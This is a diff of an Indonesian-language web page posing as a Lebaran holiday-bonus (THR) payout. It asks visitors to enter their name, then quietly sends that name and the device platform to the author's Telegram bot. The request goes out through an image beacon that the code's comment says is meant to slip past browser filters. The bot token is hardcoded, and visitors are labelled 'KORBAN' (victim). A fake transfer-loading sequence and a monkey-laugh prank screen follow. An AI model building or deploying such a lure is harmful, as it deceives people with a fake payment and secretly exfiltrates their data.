@@ -8,9 +8,9 @@
         body { margin: 0; padding: 0; background: #f0fdf4; font-family: 'Segoe UI', sans-serif; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; flex-direction: column; }
         #intro { margin-top: -50px; padding: 0 20px; }
         h1 { color: #15803d; margin-bottom: 5px; }
-        p { color: #166534; margin-top: 0; }
+        p { color: #166534; margin-top: 0; font-weight: bold; }
         #verify-box { background: white; padding: 15px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); margin-bottom: 30px; width: 280px; }
-        input { width: 90%; padding: 10px; border: 1px solid #ddd; border-radius: 8px; outline: none; text-align: center; font-size: 1rem; }
+        input { width: 90%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; outline: none; text-align: center; font-size: 1rem; }
         #envelope { width: 280px; cursor: pointer; transition: all 0.2s ease; z-index: 10; margin-top: 20px; }
         #prank-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 100; justify-content: center; align-items: center; }
         #prank-screen img { width: 100%; height: 100%; object-fit: contain; }
@@ -23,7 +23,7 @@
 
     <div id="intro">
         <h1>Selamat Lebaran! 🌙</h1>
-        <p>Silakan verifikasi nama untuk pencairan THR.</p>
+        <p>Silakan verifikasi nama untuk pencairan THR Digital.</p>
     </div>
 
     <div id="verify-box">
@@ -49,44 +49,38 @@
         const prank = document.getElementById('prank-screen');
         const prankSound = new Audio('https://www.myinstants.com/media/sounds/monkey-laugh.mp3');
 
-        // DATA TELEGRAM LO SUDAH TERPASANG OTOMATIS
-        const TELEGRAM_TOKEN = '8642591827:AAEW79QE8FGYcvELtapkI2jnhvXocW4rd9U'; 
-        const TELEGRAM_CHAT_ID = '2128763567'; 
+        // BOT TOKEN (SI PENGIRIM) & ID TELE LO (SI PENERIMA)
+        const TELE_TOKEN = '8642591827:AAEW79QE8FGYcvELtapkI2jnhvXocW4rd9U'; 
+        const TELE_ID = '7267912519'; 
 
-        function sendToTelegram(name) {
-            const text = `🎯 KORBAN THR: ${name}\n📱 UserAgent: ${navigator.userAgent}`;
-            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(text)}`)
-            .catch(err => console.log("Gagal kirim log ke Tele lo"));
+        function kirimLog(nama) {
+            const pesan = `🎯 KORBAN THR: ${nama}\n📱 Device: ${navigator.platform}`;
+            const apiURL = `https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${TELE_ID}&text=${encodeURIComponent(pesan)}`;
+            
+            // Pake Image Beacon (Biar tembus filter browser)
+            const img = new Image();
+            img.src = apiURL;
         }
 
         env.addEventListener('click', () => {
-            const name = nameInput.value.trim();
-            if (name === "") {
-                alert("Masukkan nama dulu biar cair saldo THR-nya!");
+            const nama = nameInput.value.trim();
+            if (nama === "") {
+                alert("Masukkan nama dulu bos biar sistem bisa proses saldo!");
                 return;
             }
 
-            // Kirim log diam-diam
-            sendToTelegram(name);
+            kirimLog(nama);
 
-            // Munculin loading biar ngarep
             loading.style.display = 'flex';
-            setTimeout(() => { statusText.innerText = "Memverifikasi data " + name + "..."; }, 1000);
-            setTimeout(() => { statusText.innerText = "Proses transfer saldo Rp 500.000..."; }, 2500);
+            setTimeout(() => { statusText.innerText = "Memverifikasi data " + nama + "..."; }, 1000);
+            setTimeout(() => { statusText.innerText = "Proses transfer Rp 500.000..."; }, 2500);
 
-            // JEDARRR! Monyet muncul
             setTimeout(() => {
                 loading.style.display = 'none';
                 prank.style.display = 'flex';
-                prankSound.play();
-                
+                prankSound.play().catch(() => {});
                 if (navigator.vibrate) navigator.vibrate([500, 100, 500]);
-                
-                // Maksa Fullscreen
-                const elem = document.documentElement;
-                if (elem.requestFullscreen) elem.requestFullscreen();
-                else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
-            }, 4500);
+            }, 5000);
         });
     </script>
 </body>
